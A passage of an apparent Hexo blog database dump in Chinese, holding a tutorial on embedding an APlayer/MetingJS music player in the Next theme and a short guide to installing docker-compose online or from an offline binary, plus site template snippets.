align=\"center\">自动播放，移动端浏览器暂时不支持此功能</td>\n</tr>\n<tr>\n<td align=\"center\">mutex</td>\n<td align=\"center\">true</td>\n<td align=\"center\">该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td>\n</tr>\n<tr>\n<td align=\"center\">listmaxheight</td>\n<td align=\"center\">340px</td>\n<td align=\"center\">播放列表的最大高度</td>\n</tr>\n<tr>\n<td align=\"center\">preload</td>\n<td align=\"center\">auto</td>\n<td align=\"center\">音乐文件预载入模式，可选项： none, metadata, auto</td>\n</tr>\n<tr>\n<td align=\"center\">theme</td>\n<td align=\"center\">#ad7a86</td>\n<td align=\"center\">播放器风格色彩设置</td>\n</tr>\n</tbody></table>\n<h3 id=\"设置播放器吸底模式\"><a href=\"#设置播放器吸底模式\" class=\"headerlink\" title=\"设置播放器吸底模式\"></a>设置播放器吸底模式</h3><p>可以将播放器缩小在左下角，也称作“吸底模式”<br>如果在文章中将播放器的参数fixed激活，只会固定在文章页面中，要将其放在文章外，即博客的左下角，需要另外修改页面代码。<br>打开themes&#x2F;next&#x2F;layout&#x2F;_layout.njk文件，在body标签里面的最后处加入aplyer的实例html代码。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=<span class=\"string\">&quot;aplayer&quot;</span> </span><br><span class=\"line\">  data-id=<span class=\"string\">&quot;387465322&quot;</span> </span><br><span class=\"line\">  data-server=<span class=\"string\">&quot;netease&quot;</span> </span><br><span class=\"line\">  data-type=<span class=\"string\">&quot;playlist&quot;</span> </span><br><span class=\"line\">  data-fixed=<span class=\"string\">&quot;true&quot;</span> </span><br><span class=\"line\">  data-autoplay=<span class=\"string\">&quot;false&quot;</span> </span><br><span class=\"line\">  data-order=<span class=\"string\">&quot;list&quot;</span> </span><br><span class=\"line\">  data-volume=<span class=\"string\">&quot;0.5&quot;</span> </span><br><span class=\"line\">  data-theme=<span class=\"string\">&quot;#1da496&quot;</span> </span><br><span class=\"line\">  data-preload=<span class=\"string\">&quot;auto&quot;</span> &gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在footer或者header引入依赖文件Aplayer.js和Meting.js，metingjs依赖aplayerjs，所以请注意顺序。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;<span class=\"built_in\">link</span> rel=<span class=\"string\">&quot;stylesheet&quot;</span> href=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css&quot;</span>&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>因为在主题文件中手动加入了依赖文件，所以可以在hexo配置文件中关闭插件的自动脚本插入功能：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aplayer:</span><br><span class=\"line\">  meting: <span class=\"literal\">true</span></span><br><span class=\"line\">  asset_inject: <span class=\"literal\">false</span> <span class=\"comment\"># 关闭自动脚本插入</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/09/07/hexo-music/3.png\" alt=\"吸底效果图\"></p>\n<h3 id=\"引入pjax实现全局播放\"><a href=\"#引入pjax实现全局播放\" class=\"headerlink\" title=\"引入pjax实现全局播放\"></a>引入pjax实现全局播放</h3><p>当进入其他页面时，吸底播放器会被打断。要实现音乐的不间断播放，也就是全局音乐效果，可以使用pjax。Next主题已经自带了MoOx&#x2F;pjax，可手动开启。</p>\n<p>在主题设置文件_config.yml中将pjax设置为true。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>突然的心血来潮想尝试在博客中也可以播放音乐，因为之前也见过大佬的博客有这样的功能，今天抽空研究了一下，没想到竟然成功了，赶紧记录下来。</p>\n<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><ol>\n<li>安装插件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-tag-aplayer --save</span><br></pre></td></tr></table></figure>","more":"<p>要实现博客中添加音乐播放器的方式有两种，第一种配置简单，但是使用麻烦，所以不推荐，第二种配置麻烦，使用简单，所以比较推荐。</p>\n<h3 id=\"不推荐使用的方式\"><a href=\"#不推荐使用的方式\" class=\"headerlink\" title=\"不推荐使用的方式\"></a>不推荐使用的方式</h3><ol>\n<li>安装完成后就可以在markdown页面编辑音乐代码了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayer 断点 张敬轩 https://music.163.com/song/media/outer/url?<span class=\"built_in\">id</span>=189323.mp3  %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的案例基本按照这样的代码格式进行编写：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>详细参数如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">title</td>\n<td align=\"center\">歌曲标题</td>\n</tr>\n<tr>\n<td align=\"center\">author</td>\n<td align=\"center\">歌曲作者</td>\n</tr>\n<tr>\n<td align=\"center\">url</td>\n<td align=\"center\">音乐文件URL地址</td>\n</tr>\n<tr>\n<td align=\"center\">picture_url</td>\n<td align=\"center\">（可选）封面图片地址</td>\n</tr>\n<tr>\n<td align=\"center\">narrow</td>\n<td align=\"center\">（可选）播放器袖珍风格</td>\n</tr>\n<tr>\n<td align=\"center\">autoplay</td>\n<td align=\"center\">（可选）自动播放，移动端浏览器暂时不支持此功能</td>\n</tr>\n<tr>\n<td align=\"center\">width</td>\n<td align=\"center\">（可选）播放器宽度 (默认: 100%)</td>\n</tr>\n<tr>\n<td align=\"center\">lrc</td>\n<td align=\"center\">（可选）歌词文件 URL 地址</td>\n</tr>\n</tbody></table>\n<p>单曲样例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayer </span><br><span class=\"line\"><span class=\"string\">&quot;光るなら&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;Goose house&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;lrc:https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;width:100%&quot;</span> </span><br><span class=\"line\">%&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果如图：</p>\n<p><img src=\"/2023/09/07/hexo-music/1.png\" alt=\"单曲效果图\"></p>\n<p>除了可以添加一首歌曲，还以编辑歌单，代码如下：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayerlist %&#125;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;narrow&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;autoplay&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;mode&quot;</span>: <span class=\"string\">&quot;random&quot;</span>,//（可选）<span class=\"string\">&#x27;random&#x27;</span>, <span class=\"string\">&#x27;single&#x27;</span> (单曲播放), <span class=\"string\">&#x27;circulation&#x27;</span> (循环播放), <span class=\"string\">&#x27;order&#x27;</span> (列表播放)， 默认：<span class=\"string\">&#x27;circulation&#x27;</span> </span><br><span class=\"line\">    <span class=\"string\">&quot;showlrc&quot;</span>: 3,</span><br><span class=\"line\">    <span class=\"string\">&quot;mutex&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;theme&quot;</span>: <span class=\"string\">&quot;#e6d0b2&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;preload&quot;</span>: <span class=\"string\">&quot;metadata&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;listmaxheight&quot;</span>: <span class=\"string\">&quot;513px&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;music&quot;</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;title&quot;</span>: <span class=\"string\">&quot;前前前世&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;author&quot;</span>: <span class=\"string\">&quot;RADWIMPS&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;url&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.mp3&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;pic&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.jpg&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;lrc&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.lrc&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;title&quot;</span>: <span class=\"string\">&quot;光るなら&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;author&quot;</span>: <span class=\"string\">&quot;Goose house&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;url&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;pic&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;lrc&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#123;% endaplayerlist %&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/09/07/hexo-music/2.png\" alt=\"歌单效果图\"></p>\n<p>歌曲文件，歌曲封面都可以引用本地文件，但是因为音乐，封面，歌词文件都需要自己进行查找，并且还需要借助CDN进行外链生成，很麻烦，所以不建议使用这种方式。</p>\n<h3 id=\"推荐使用的方式，引入MetingJS支持\"><a href=\"#推荐使用的方式，引入MetingJS支持\" class=\"headerlink\" title=\"推荐使用的方式，引入MetingJS支持\"></a>推荐使用的方式，引入MetingJS支持</h3><blockquote>\n<p>MetingJS是基于Meting API的APlayer衍生播放器</p>\n</blockquote>\n<p>通过引入MetingJS，播放器将支持QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。这种方式比较方便添加在线音乐播放列表。</p>\n<ol>\n<li>引入需要在Hexo的配置文件_config.yml中设置。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aplayer:</span><br><span class=\"line\">  meting: <span class=\"literal\">true</span> <span class=\"comment\"># MetingJS 支持</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>在任意一个Markdown文件里使用 形如以下代码即可使用播放音乐</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% meting <span class=\"string\">&quot;2410869513&quot;</span> <span class=\"string\">&quot;netease&quot;</span> <span class=\"string\">&quot;playlist&quot;</span> %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的案例基本按照这样的代码格式进行编写：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% meting <span class=\"string\">&quot;60198&quot;</span> <span class=\"string\">&quot;netease&quot;</span> <span class=\"string\">&quot;playlist&quot;</span> <span class=\"string\">&quot;autoplay&quot;</span> <span class=\"string\">&quot;mutex:false&quot;</span> <span class=\"string\">&quot;listmaxheight:340px&quot;</span> <span class=\"string\">&quot;preload:none&quot;</span> <span class=\"string\">&quot;theme:#ad7a86&quot;</span> %&#125;</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">默认</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">id</td>\n<td align=\"center\">必须值</td>\n<td align=\"center\">歌曲 id、播放列表 id、相册 id、搜索关键字</td>\n</tr>\n<tr>\n<td align=\"center\">server</td>\n<td align=\"center\">必须值</td>\n<td align=\"center\">音乐平台: netease, tencent, kugou, xiami, baidu</td>\n</tr>\n<tr>\n<td align=\"center\">type</td>\n<td align=\"center\">必须值</td>\n<td align=\"center\">song, playlist, album, search, artist</td>\n</tr>\n<tr>\n<td align=\"center\">fixed</td>\n<td align=\"center\">false</td>\n<td align=\"center\">开启固定模式</td>\n</tr>\n<tr>\n<td align=\"center\">mini</td>\n<td align=\"center\">false</td>\n<td align=\"center\">开启迷你模式</td>\n</tr>\n<tr>\n<td align=\"center\">loop</td>\n<td align=\"center\">all</td>\n<td align=\"center\">列表循环模式：all, one,none</td>\n</tr>\n<tr>\n<td align=\"center\">order</td>\n<td align=\"center\">list</td>\n<td align=\"center\">列表播放模式： list, random</td>\n</tr>\n<tr>\n<td align=\"center\">volume</td>\n<td align=\"center\">0.7</td>\n<td align=\"center\">播放器音量</td>\n</tr>\n<tr>\n<td align=\"center\">lrctype</td>\n<td align=\"center\">0</td>\n<td align=\"center\">歌词格式类型</td>\n</tr>\n<tr>\n<td align=\"center\">listfolded</td>\n<td align=\"center\">false</td>\n<td align=\"center\">指定音乐播放列表是否折叠</td>\n</tr>\n<tr>\n<td align=\"center\">storagename</td>\n<td align=\"center\">metingjs</td>\n<td align=\"center\">LocalStorage 中存储播放器设定的键名</td>\n</tr>\n<tr>\n<td align=\"center\">autoplay</td>\n<td align=\"center\">true</td>\n<td align=\"center\">自动播放，移动端浏览器暂时不支持此功能</td>\n</tr>\n<tr>\n<td align=\"center\">mutex</td>\n<td align=\"center\">true</td>\n<td align=\"center\">该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td>\n</tr>\n<tr>\n<td align=\"center\">listmaxheight</td>\n<td align=\"center\">340px</td>\n<td align=\"center\">播放列表的最大高度</td>\n</tr>\n<tr>\n<td align=\"center\">preload</td>\n<td align=\"center\">auto</td>\n<td align=\"center\">音乐文件预载入模式，可选项： none, metadata, auto</td>\n</tr>\n<tr>\n<td align=\"center\">theme</td>\n<td align=\"center\">#ad7a86</td>\n<td align=\"center\">播放器风格色彩设置</td>\n</tr>\n</tbody></table>\n<h3 id=\"设置播放器吸底模式\"><a href=\"#设置播放器吸底模式\" class=\"headerlink\" title=\"设置播放器吸底模式\"></a>设置播放器吸底模式</h3><p>可以将播放器缩小在左下角，也称作“吸底模式”<br>如果在文章中将播放器的参数fixed激活，只会固定在文章页面中，要将其放在文章外，即博客的左下角，需要另外修改页面代码。<br>打开themes&#x2F;next&#x2F;layout&#x2F;_layout.njk文件，在body标签里面的最后处加入aplyer的实例html代码。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=<span class=\"string\">&quot;aplayer&quot;</span> </span><br><span class=\"line\">  data-id=<span class=\"string\">&quot;387465322&quot;</span> </span><br><span class=\"line\">  data-server=<span class=\"string\">&quot;netease&quot;</span> </span><br><span class=\"line\">  data-type=<span class=\"string\">&quot;playlist&quot;</span> </span><br><span class=\"line\">  data-fixed=<span class=\"string\">&quot;true&quot;</span> </span><br><span class=\"line\">  data-autoplay=<span class=\"string\">&quot;false&quot;</span> </span><br><span class=\"line\">  data-order=<span class=\"string\">&quot;list&quot;</span> </span><br><span class=\"line\">  data-volume=<span class=\"string\">&quot;0.5&quot;</span> </span><br><span class=\"line\">  data-theme=<span class=\"string\">&quot;#1da496&quot;</span> </span><br><span class=\"line\">  data-preload=<span class=\"string\">&quot;auto&quot;</span> &gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在footer或者header引入依赖文件Aplayer.js和Meting.js，metingjs依赖aplayerjs，所以请注意顺序。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;<span class=\"built_in\">link</span> rel=<span class=\"string\">&quot;stylesheet&quot;</span> href=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css&quot;</span>&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>因为在主题文件中手动加入了依赖文件，所以可以在hexo配置文件中关闭插件的自动脚本插入功能：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aplayer:</span><br><span class=\"line\">  meting: <span class=\"literal\">true</span></span><br><span class=\"line\">  asset_inject: <span class=\"literal\">false</span> <span class=\"comment\"># 关闭自动脚本插入</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/09/07/hexo-music/3.png\" alt=\"吸底效果图\"></p>\n<h3 id=\"引入pjax实现全局播放\"><a href=\"#引入pjax实现全局播放\" class=\"headerlink\" title=\"引入pjax实现全局播放\"></a>引入pjax实现全局播放</h3><p>当进入其他页面时，吸底播放器会被打断。要实现音乐的不间断播放，也就是全局音乐效果，可以使用pjax。Next主题已经自带了MoOx&#x2F;pjax，可手动开启。</p>\n<p>在主题设置文件_config.yml中将pjax设置为true。</p>"},{"title":"docker-compose 安装","date":"2023-11-03T15:28:03.000Z","_content":"\n### 在线安装\n\n安装命令在github上，下载起来会很慢，可自行尝试。   \n如果出现`url: (7) Failed to connect to github.com port 443: 拒绝连接`错误，可以通过在`/etc/hosts`文件里添加`140.82.114.3 github.com`条目解决。\n\n```bash\nsudo curl -L \"https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n```\n\n<!-- more -->\n\n### 离线安装\n\n如果因为网络问题不能安装的话，可以通过离线安装，在这里提供一个 V2.23.0 版本的包。[**docker-compose-linux-x86_64**](https://pan.baidu.com/s/1QB1o3NeihQoWKZ6q0pG6MQ?pwd=hsu3)，提取码：hsu3。\n\n上传到服务器后，执行以下操作：\n\n```bash\nmv docker-compose-linux-x86_64 /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -v\n```\n\n如果看到版本号在，即安装成功。","source":"_posts/install-docker-compose.md","raw":"---\ntitle: docker-compose 安装\ndate: 2023-11-03 23:28:03\ncategories: 技术\ntags:\n  - Docker\n---\n\n### 在线安装\n\n安装命令在github上，下载起来会很慢，可自行尝试。   \n如果出现`url: (7) Failed to connect to github.com port 443: 拒绝连接`错误，可以通过在`/etc/hosts`文件里添加`140.82.114.3 github.com`条目解决。\n\n```bash\nsudo curl -L \"https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n```\n\n<!-- more -->\n\n### 离线安装\n\n如果因为网络问题不能安装的话，可以通过离线安装，在这里提供一个 V2.23.0 版本的包。[**docker-compose-linux-x86_64**](https://pan.baidu.com/s/1QB1o3NeihQoWKZ6q0pG6MQ?pwd=hsu3)，提取码：hsu3。\n\n上传到服务器后，执行以下操作：\n\n```bash\nmv docker-compose-linux-x86_64 /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -v\n```\n\n如果看到版本号在，即安装成功。","slug":"install-docker-compose","published":1,"updated":"2024-05-03T03:55:54.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fv00697zj33pgm5zks","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"在线安装\"><a href=\"#在线安装\" class=\"headerlink\" title=\"在线安装\"></a>在线安装</h3><p>安装命令在github上，下载起来会很慢，可自行尝试。<br>如果出现<code>url: (7) Failed to connect to github.com port 443: 拒绝连接</code>错误，可以通过在<code>/etc/hosts</code>文件里添加<code>140.82.114.3 github.com</code>条目解决。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo curl -L <span class=\"string\">&quot;https://github.com/docker/compose/releases/latest/download/docker-compose-<span class=\"subst\">$(uname -s)</span>-<span class=\"subst\">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h3 id=\"离线安装\"><a href=\"#离线安装\" class=\"headerlink\" title=\"离线安装\"></a>离线安装</h3><p>如果因为网络问题不能安装的话，可以通过离线安装，在这里提供一个 V2.23.0 版本的包。<a href=\"https://pan.baidu.com/s/1QB1o3NeihQoWKZ6q0pG6MQ?pwd=hsu3\"><strong>docker-compose-linux-x86_64</strong></a>，提取码：hsu3。</p>\n<p>上传到服务器后，执行以下操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class=\"line\">docker-compose -v</span><br></pre></td></tr></table></figure>\n\n<p>如果看到版本号在，即安装成功。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    